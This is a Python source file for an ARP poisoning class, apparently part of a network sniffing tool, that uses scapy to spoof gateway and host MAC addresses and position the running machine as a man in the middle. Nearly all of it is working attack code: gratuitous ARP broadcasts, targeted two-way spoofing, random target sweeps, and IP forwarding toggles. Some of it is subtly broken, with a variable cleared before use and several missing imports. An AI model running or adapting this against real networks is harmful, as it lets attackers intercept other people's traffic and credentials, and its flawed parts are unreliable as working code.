# -*- coding: utf8 -*-

# Copyright (C) Christian Barral López - All Rights Reserved
# Unauthorized copyright of this file, via any medium is strictly prohibited
# Proprietary and confidential
# Written by Christian Barral <cbarrallopez@gmail.com>, May 2019

import netifaces
import sys
import signal
import PSCAD.lib.helpers.ip_utils as ip_utils

from PSCAD.lib.helpers.colors import *
from datetime import datetime
from scapy.sendrecv import *
from scapy.layers.l2 import *


class ARPPoisoner:
    """Implementation of a thread-based ARP Poisoner to position this host in the
    middle of the network communications. The only address required is the Gateway's
    IP address, other information needed like local IP, local MAC or other MAC address
    are calculated and/or requested in this class, either thanks to Python modules or ARP packets.
    The __init__ function assigns the Gateway's IP address and NIC. From that information, it also
    sets the local IP, network mask, broadcast address and local MAC Address. The localnet, targets and
    randomize parameters specify which type of ARP Poison is going to be executed. Although this class
    could be instantiated with all three types at the same time, the restriction for only choosing one
    is situated in the ConfigurationLoader class.

        :param interface: Interface to be used by scapy
        :param gateway_ip: Network's gateway IP address
        :param targets: Specify the targets to poison.
        :param localnet: Poison the hole network.
        :param randomize: Poison a number of random hosts on the network.
        :param arp_type: Choose between 'is-at', 'who-is' or both types of Gratuitous ARP to use for poisoning.
        :param verbose: Verbose level for scapy
        :type interface: str
        :type gateway_ip: str
        :type targets: list
        :type localnet: bool
        :type randomize: int
        :type arp_type: int, str
        :type verbose: int

    Apart from class __init__ arguments, there are another attributes.
    Attributes:
        __layer_two_socket: L2pcapSccket. Socket to send layer 2 packets.
        __layer_three_socket: L3pcapSocket. Socket to send layer 3 packets.
        __my_ip: str. IP from host executing the application.
        __my_mac: str. MAC address from host executing the application.
        __broadcast: str. Broadcast address from the network the host is connected to.
        __netmask: str. Dotted decimal format from the network the host is connected to.
        __gateway_mac: str. MAC address from the gateway.
        __stop: bool. Flag representing if the ARP poisoning must be executed.
        __known_targets: dict. IP => MAC from every known target being poisoned.

    warning::
        This class and all it's features were made for ethical security reasons. The author is NOT
        responsible for any of the potential damage other users could cause.

    see_also::
        lib.core.ConfigurationLoader to see the sniffer application parameters.

    note::
        ARP packets crafted on this class are based on RFC 826 and RFC 5227, so the header fields are built
        following the ARP request, ARP response and Gratuitous ARP standards, which define that:

        On ARP Request:
            - op (Operation): 1 for ARP Request
            - hwsrc: SHA, Sender MAC Address. On request, MAC address from the host that is requesting another MAC
            - psrc: SPA, Sender Protocol Address. On request, IP address from the host that is requesting another MAC
            - hwdst: THA, Target Hardware Address, 00:00:00:00:00:00 for MAC requesting
            - pdst: TPA, Target Protocol Address, IP address from the host whose MAC is being requested

        On ARP Response:
            - op (Operation): 2 for ARP Response
            - hwsrc: SHA, Sender Mac Address. On response, contains the MAC that the ARP Response
                was looking for.
            - psrc: SPA, Sender Protocol Address. On response, contains the IP from that host that responded to
                the ARP Request
            - hwdst: THA, Target Hardware Address. On response, contains the MAC address of the host that
                originated the ARP Request.
            - pdst: TPA, Target Protocol Address. On response, contains the IP address of the host that
                originated the ARP Request.

        On Gratuitous ARP:
            - op (Operation): 1 or 2, depending on the OS architecture, a host will respond to Request or Reply
            - psrc: SPA, Sender Protocol Address. IP whose MAC address will be overridden in all ARP tables.
            - hwsrc: SHA, Sender MAC Address. MAC to override in all ARP tables.
            - hwdst: Ignored, should be 'ff:ff:ff:ff:ff:ff' but it's set on the Ethernet layer.
            . pdst: To follow Gratuitous ARP standard, has to be the same value as SPA (psrc).
    """

    def __init__(self,
                 interface,
                 gateway_ip,
                 targets,
                 localnet,
                 randomize,
                 arp_type,
                 verbose):
        # Assign sockets afterwards, because they open as soon as they are created
        self.__layer_two_socket = None
        self.__layer_three_socket = None
        self.__gateway_ip = gateway_ip
        try:
            self.__my_ip = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']
            self.__my_mac = netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]['addr']
            self.__broadcast = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['broadcast']
            self.__netmask = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['netmask']
        except (KeyError, IndexError, ValueError):
            halt_fail("Please specify a valid interface. Ex: eth0, wlan1, en0...")
        self.__gateway_mac = self.get_mac(self.gateway_ip)
        if not self.gateway_mac:
            halt_fail('Could not obtain gateway\'s MAC Address, exiting...')
        else:
            print_success('Gateway\'s MAC address: {}'.format(self.gateway_mac))
        if targets is not None:
            self.__targets = ip_utils.parse_targets(targets)
        else:
            self.__targets = None
        self.__localnet = localnet
        self.__randomize = randomize
        self.__arp_type = arp_type

        self.__stop = False
        self.__known_targets = {}

        # Scapy configuration
        conf.iface = interface
        conf.verb = verbose

    @property
    def my_ip(self):
        return self.__my_ip

    @property
    def my_mac(self):
        return self.__my_mac

    @property
    def broadcast(self):
        return self.__broadcast

    @property
    def netmask(self):
        return self.__netmask

    @property
    def gateway_ip(self):
        return self.__gateway_ip

    @property
    def gateway_mac(self):
        return self.__gateway_mac

    @property
    def targets(self):
        return self.__targets

    @property
    def localnet(self):
        return self.__localnet

    @property
    def randomize(self):
        return self.__randomize

    @property
    def arp_type(self):
        return self.__arp_type

    @property
    def known_targets(self):
        return self.__known_targets

    @property
    def stop(self):
        return self.__stop

    @stop.setter
    def stop(self, value):
        self.__stop = value

    @property
    def layer_two_socket(self):
        return self.__layer_two_socket

    @property
    def layer_three_socket(self):
        return self.__layer_three_socket

    def add_target(self, target_ip, target_mac):
        """ Adds a host IP and MAC Address to the targets dictionary as key-value, respectively.

                :param target_ip: Target's IP Address
                :param target_mac: Target's MAC Address
                :type target_ip: str
                :type target_mac: str
        """
        self.known_targets[target_ip] = target_mac

    def get_mac(self, ip_address):
        """Sends a MAC-Broadcast ARP Request asking for the MAC Address of an IP Address. In response, two values
        are returned: responded and unanswered requests, only the first returned value is important.
        The responded packet list is divided into sent packets and received packets,
        only the received packets are important.

            :param ip_address: Target IP Address to get the MAC
            :type ip_address: String
            :return: MAC Address if the host responds
            :return: None if it does not respond
            :rtype: str, None
        """
        # If sockets are not opened yet
        if self.__layer_three_socket is None:
            response, _ = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=3)

        # If socket is opened, send ARP packet through layer 3 socket.
        else:
            response, _ = sndrcv(self.layer_three_socket, ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address),
                                 retry=3, timeout=5)
        # For each response
        for _, r in response:
            try:
                # Return the source MAC address if not IndexError, None in the other case
                return str(r[ARP].hwsrc)
            except IndexError:
                return None

    def __arp_lookup(self):
        """ Sniffs for ARP packets and applies the callback function __arp_crafting() to each one.
        """
        print_warning('Entering ARP Lookup.')
        try:
            sniff(filter='arp', prn=self.__arp_crafting)
        except KeyboardInterrupt:
            print_warning('Stopping ARP Lookup.')
        except Exception as e:
            halt_fail('Unexpected error while poisoning: {}'.format(e))

    def __arp_crafting(self, packet):
        """ Creates an ARP Poisoning packet depending on the host that sent the ARP Request.

        Used as a callback function for the localnet persistent ARP poisoning, in case some host does not poison
        with Gratuitous ARP.

            :param packet: Packet to process.
        """

        if not self.stop:

            # As the sniffer using this callback function should only process ARP packets, this is not strictly needed.
            # But should check it anyways, in case of any unexpected behaviour.
            if ARP not in packet:
                return

            # If it's not request
            elif packet[ARP].op != 1:
                return

            # If ARP Request
            else:
                # If it is a MAC Request
                if str(packet[ARP].hwdst) == '00:00:00:00:00:00':
                    packet = None
                    packet_src_ip = str(packet[ARP].psrc)
                    packet_dst_ip = str(packet[ARP].pdst)
                    packet_src_mac = str(packet[ARP].hwsrc)

                    # If host is requesting gateway's IP Address
                    if (packet_dst_ip == self.gateway_ip and
                            packet_src_ip != self.my_ip):
                        packet = ARP(
                            op=2,
                            psrc=self.gateway_ip,
                            hwsrc=self.my_mac,
                            pdst=packet_src_ip,
                            hwdst=packet_src_mac
                        )

                    # If gateway is requesting host's IP Address
                    elif (packet_src_mac == self.gateway_mac and
                          packet_dst_ip != self.my_ip):
                        packet = ARP(
                            op=2,
                            psrc=packet_dst_ip,
                            hwsrc=self.my_mac,
                            pdst=self.gateway_ip,
                            hwdst=self.gateway_mac
                        )

                    # If gateway is requesting the MAC address from where this application is being used.
                    elif (packet_dst_ip == self.my_ip and
                          packet_src_mac == self.gateway_mac):
                        packet = ARP(
                            op=2,
                            psrc=self.my_ip,
                            hwsrc=self.my_mac,
                            pdst=self.gateway_ip,
                            hwdst=self.gateway_mac
                        )

                    if packet is not None:
                        self.add_target(packet_src_ip, packet_src_mac)
                        self.layer_three_socket.send(packet)

    def restore_network(self):
        """Sends ARP packets to restore the default values of the ARP tables from the network.

        If the selected poisoning was localnet, send Gratuitous ARP Packets to all the users on the network to restore
        their connection. In case of randomized or targeted poisoning, individual ARP Responses are crafted and sent to
        the known poisoned hosts. Finally, it disables IP forwarding, closes the sockets and forces the application
        to shutdown with a SIGTERM.

        warning::
            When restoring the network for non localnet poisoning, broadcast MAC address is used. As specified in
            RFC 826, it is a non desirable behaviour from the ARP protocol, but in RFC 5227 it is also said that
            a broadcast ARP Reply is preferred to avoid IP conflicts. Since ARP poisoning may actually cause
            conflicts in ARP tables, using the RFC 5228 perspective is better in this case.

        note::
            Using the SIGTERM is needed here, because scapy does not stop sending packets even though the
            user stops the application execution, so it's needed to force it.
        """

        # Sleep time enough to let all the threads end their loop.
        print_warning('Network restoration will begin in 5 seconds...')
        time.sleep(5)

        # Restore hole network connection with the gateway with 3 Gratuitous ARP
        # Only if -l/--localnet option was selected
        if self.localnet:
            for i in range(3):
                self.layer_three_socket.send(
                    Ether(
                        src=self.gateway_mac,
                        dst='ff:ff:ff:ff:ff:ff'
                    ) / ARP(
                        op=2,
                        hwsrc=self.gateway_mac,
                        psrc=self.gateway_ip,
                        pdst=self.gateway_ip,
                        hwdst='ff:ff:ff:ff:ff:ff'
                    ))
                self.layer_three_socket.send(
                    Ether(
                        src=self.gateway_mac,
                        dst='ff:ff:ff:ff:ff:ff'
                    ) / ARP(
                        op=1,
                        hwsrc=self.gateway_mac,
                        psrc=self.gateway_ip,
                        pdst=self.gateway_ip,
                        hwdst='ff:ff:ff:ff:ff:ff'
                    ))

                # Sleep 2 seconds for each pair of packets sent.
                time.sleep(2)

            print_success('Basic network communication restored with Gratuitous ARP.')

        # If no localnet sniffing was made, restore each ARP table individually with targeted ARP
        else:
            # For each target IP and MAC on known targets
            for target_ip, target_mac in self.known_targets.items():
                # Send ARPs to restore the ARP tables values
                for i in range(2):
                    self.layer_three_socket.send(
                        Ether(
                            src=target_mac,
                            dst='ff:ff:ff:ff:ff:ff'
                        ) / ARP(
                            op=2,
                            psrc=target_ip,
                            pdst=self.gateway_ip,
                            hwsrc=target_mac,
                            hwdst='ff:ff:ff:ff:ff:ff'
                        ))
                    self.layer_three_socket.send(
                        Ether(
                            src=self.gateway_mac,
                            dst='ff:ff:ff:ff:ff:ff'
                        ) / ARP(
                            psrc=self.gateway_ip,
                            hwsrc=self.gateway_mac,
                            pdst=target_ip,
                            hwdst='ff:ff:ff:ff:ff:ff'
                        ))

                print_success('Network restored for {}'.format(target_ip))

        print_warning("Disabling IP Forwarding...")
        # ip forwarding command with that redirects output to /dev/null
        with open('/dev/null', 'wb') as null_file:
            if sys.platform == 'darwin':
                subprocess.call(["sysctl", "-w", "net.inet.ip.forwarding=0"],
                                stdout=null_file, stderr=subprocess.STDOUT)
            elif sys.platform == 'linux' or sys.platform == 'linux2':
                subprocess.call(["sysctl", "-w", "net.ipv4.ip_forward=0"],
                                stdout=null_file, stderr=subprocess.STDOUT)
            else:
                halt_fail('Non supported platform for sniffing.')

        print_warning("Closing sockets...")
        self.layer_two_socket.close()
        self.layer_three_socket.close()
        print_warning("Killing process...")
        # Kill process by PID and C inherited SIGTERM: Force shutdown.
        os.kill(os.getpid(), signal.SIGTERM)
        print_success("Process killed.")

    def __localnet_poison(self):
        """ Sends Gratuitous ARP Requests and/or Responses to update all the ARP tables on the network, telling
        that the MAC of the host running this application is the Gateway's MAC, so all outgoing traffic will
        be redirected.
        """

        try:
            arp_mode = int(self.arp_type)
        except ValueError:
            corresponding_values = {
                'is-at': 1,
                'who-is': 2,
                'both': 3
            }
            arp_mode = corresponding_values[self.arp_type]

        def who_is_poisoning():
            """ Sends a Gratuitous who-is ARP Packet to tell the network
            that the host executing this application is the gateway.
            """
            self.layer_two_socket.send(
                Ether(
                    src=self.my_mac,
                    dst='ff:ff:ff:ff:ff:ff'
                ) / ARP(
                    op=1,
                    psrc=self.gateway_ip,
                    pdst=self.gateway_ip,
                    hwsrc=self.my_mac,
                    hwdst='ff:ff:ff:ff:ff:ff'
                )
            )

        def is_at_poisoning():
            """ Sends a Gratuitous is-at ARP Packet to tell the network
            that the host executing this application is the gateway.
            """
            self.layer_two_socket.send(
                Ether(
                    src=self.my_mac,
                    dst='ff:ff:ff:ff:ff:ff'
                ) / ARP(
                    op=2,
                    psrc=self.gateway_ip,
                    pdst=self.gateway_ip,
                    hwsrc=self.my_mac,
                    hwdst='ff:ff:ff:ff:ff:ff'
                )
            )

        # Execute proper inner function depending on ARP mode
        while not self.stop:

            print_success('Sending Gratuitous ARP')

            if arp_mode == 1:
                who_is_poisoning()
            elif arp_mode == 2:
                is_at_poisoning()
            else:
                who_is_poisoning()
                time.sleep(0.5)
                is_at_poisoning()

            # Sleep 2 seconds until next poisoning
            time.sleep(2)

    def __targeted_poison(self, targets=None):
        """ Poisons every target from the target list sending targeted ARP Packets, both to the target and
        the gateway itself to spoof MAC Addresses on both sides of the communication, every 3 seconds. Every 10
        intervals, which would be every 30 seconds, the target's MAC Addresses are updated to re-poison
        any host in the network that may have changed it's MAC Address.

            :param targets: self.targets dictionary modification
            :type targets: dict
        """

        print_warning('Starting targeted poisoning.')
        # If a targets dict is passed, override the self.targets attribute
        if targets is not None:
            self.__known_targets = {x: y for x, y in targets.items()}
        else:
            print_warning('Attempting to get targets\' MAC Address....')
            for target_ip in self.targets:
                if target_ip != self.gateway_ip:
                    # Get target MAC
                    target_mac = self.get_mac(target_ip)
                    # If target MAC was found
                    if target_mac is not None:
                        self.add_target(target_ip, target_mac)
                        print_success('Added target: {} -> {}'.format(target_ip, target_mac))

        if not len(self.known_targets):
            halt_fail('Could not obtain any MAC Address from selected targets.')

        while not self.stop:
            for target_ip, target_mac in self.known_targets.items():
                # MITM ARP Poisoning
                self.layer_two_socket.send(
                    Ether(
                        src=self.my_mac,
                        dst=target_mac
                    ) / ARP(
                        op=2,
                        psrc=self.gateway_ip,
                        hwsrc=self.my_mac,
                        pdst=target_ip,
                        hwdst=target_mac
                    )
                )
                self.layer_two_socket.send(
                    Ether(
                        src=self.my_mac,
                        dst=self.gateway_mac
                    ) / ARP(
                        op=2,
                        psrc=target_ip,
                        hwsrc=self.my_mac,
                        pdst=self.gateway_ip,
                        hwdst=self.gateway_mac
                    )
                )

            # Sleep two seconds
            time.sleep(2)

    def __randomized_poison(self):
        """ Poisons a number of random targets on the network.

        10 ARP Ping sweeps are performed before the poison starts, which may be less if the number of discovered hosts
        reach the limit established by the -r/--randomize application parameter, stored in self.randomize.
        After that, the first X hosts to respond to the ARP Request will be poisoned.
        """

        arp_ping_sweeps = 10
        current_sweep = 1
        targets = {}

        print_warning('ARP ping sweeping the network.')
        # While there are ping sweeps left, number of targets is below established limit and stop is not set.
        while current_sweep <= arp_ping_sweeps and len(targets) < self.randomize and not self.stop:
            print_success('Sweep number: {}'.format(current_sweep))
            # Unicast ARP Ping to all hosts through layer 2 socket
            responded, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')
                               / ARP(pdst=ip_utils.get_ip_with_netmask(self.my_ip, self.netmask)),
                               timeout=2)

            if len(responded):
                for _, r in responded:
                    try:
                        target_mac = r[ARP].hwsrc
                        target_ip = r[ARP].psrc
                    except IndexError:
                        target_mac = None
                        target_ip = None
                    # If still number of targets is below limit
                    if len(targets) < self.randomize:
                        # If IP-MAC are not None and it is not the gateway
                        if target_ip is not None and target_mac is not None and target_ip != self.gateway_ip:
                            # Add target
                            targets[target_ip] = target_mac
                            print_success('Added target: {} -> {}'.format(target_ip, target_mac))
                    else:
                        break

            # Add one to the number of ping sweeps.
            current_sweep += 1

            # Wait two seconds.
            time.sleep(2)

        # After gathering targets, start targeted poison from those targets.
        self.__targeted_poison(targets=targets)

    def run_poisoner(self):
        """Main class function. Initializes IP Forwarding, starts layer 2 and layer 3 sockets for sending
        packets and chooses which threads to initialize.
        """
        print_warning("Enabling IP Forwarding...")
        # UNIX based system command to enable ip forwarding and hide output
        with open('/dev/null', 'wb') as null_file:
            if sys.platform == 'darwin':
                subprocess.call(["sysctl", "-w", "net.inet.ip.forwarding=1"],
                                stdout=null_file, stderr=subprocess.STDOUT)
            elif sys.platform == 'linux' or sys.platform == 'linux2':
                subprocess.call(["sysctl", "-w", "net.ipv4.ip_forward=1"],
                                stdout=null_file, stderr=subprocess.STDOUT)
            else:
                halt_fail('Non supported platform for sniffing.')

        print_success("Starting network poisoning at %s" % datetime.now().strftime("%Y-%m-%d %H:%M:%S"))

        # Open sockets
        self.__layer_two_socket = conf.L2socket()
        self.__layer_three_socket = conf.L3socket()

        # Local network poison
        if self.localnet:
            poison_thread = threading.Thread(target=self.__localnet_poison, args=[])
            poison_thread.setDaemon(True)
            poison_thread.start()
            arp_lookup_thread = threading.Thread(target=self.__arp_lookup, args=[])
            arp_lookup_thread.setDaemon(True)
            arp_lookup_thread.start()

        # Targeted poison
        elif self.targets is not None:
            poison_thread = threading.Thread(target=self.__targeted_poison, args=[])
            poison_thread.setDaemon(True)
            poison_thread.start()

        # Random poison.
        else:
            poison_thread = threading.Thread(target=self.__randomized_poison, args=[])
            poison_thread.setDaemon(True)
            poison_thread.start()
